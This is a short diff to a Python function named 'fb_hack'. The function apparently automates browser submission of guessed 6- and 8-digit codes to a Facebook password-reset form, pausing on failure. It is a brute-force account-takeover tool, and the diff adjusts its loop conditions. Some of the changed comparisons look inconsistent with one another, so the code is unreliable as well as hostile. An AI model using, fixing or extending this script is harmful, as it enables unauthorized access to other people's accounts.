@@ -139,7 +139,7 @@ def fb_hack(email, codex):
     else:
       print(check1)
       reset = int(codex)
-    while check1 == check3:
+    while check1 != test:
       browser.select_form(nr=0)
       y = passcode6(reset)
       browser.form['n'] = y
@@ -160,7 +160,7 @@ def fb_hack(email, codex):
   elif check2 != test:
     print(check2)
     reset = int(codex)
-    while check2 == check4:
+    while check2 != check4:
       browser.select_form(nr=0)
       y = passcode8(reset)
       browser.form['n'] = y
@@ -173,7 +173,7 @@ def fb_hack(email, codex):
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
       check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
-      if check2 == check4:
+      if check2 != test:
         print(s.join(fail))
         sleep(30)
       else:
